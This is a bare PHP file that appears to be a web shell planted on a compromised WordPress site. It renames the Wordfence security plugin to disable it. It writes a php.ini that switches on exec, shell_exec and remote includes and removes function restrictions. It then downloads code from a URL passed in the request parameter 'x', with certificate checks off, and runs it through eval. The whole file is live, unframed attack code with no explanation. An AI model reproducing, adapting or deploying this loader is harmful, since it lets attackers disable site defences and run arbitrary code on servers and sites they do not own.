<?php
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence/wordfence.php')) {rename($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence',$_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence'.rand());}

$txt = base64_decode('ZGlzcGxheV9lcnJvcnMgPSBPZmYKbWF4X2V4ZWN1dGlvbl90aW1lID0gMzAKbWF4X2lucHV0X3RpbWUgPSA2MAptYXhfaW5wdXRfdmFycyA9IDEwMDAKbWVtb3J5X2xpbWl0ID0gMTI4TQpwb3N0X21heF9zaXplID0gOE0KdXBsb2FkX21heF9maWxlc2l6ZSA9IDgwTQp6bGliLm91dHB1dF9jb21wcmVzc2lvbiA9IE9mZgphbGxvd191cmxfZm9wZW4gPSBPbgpzYWZlX21vZGUgPSBPZmYKZGlzYWJsZV9mdW5jdGlvbnMgPSBOT05FCnNhZmVfbW9kZV9naWQgPSBPRkYKb3Blbl9iYXNlZGlyID0gT0ZGCmV4ZWMgPSBPTiAKc2hlbGxfZXhlYyA9IE9OCmFsbG93X3VybF9pbmNsdWRlID0gT24KYXNwX3RhZ3MgPSBPZmYKZW5hYmxlX2RsID0gT2ZmCmZpbGVfdXBsb2FkcyA9IE9u');
file_put_contents("php.ini",$txt);

if(isset($_REQUEST["x"])){

    $dir = urldecode($_REQUEST["x"]);

}

else{

    exit('FBI Waring!');

}

$a = get_contents($dir);

eval('?>'.$a);




function get_contents($url){
    $ch = curl_init("$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
    $result = curl_exec($ch);
    return $result;
}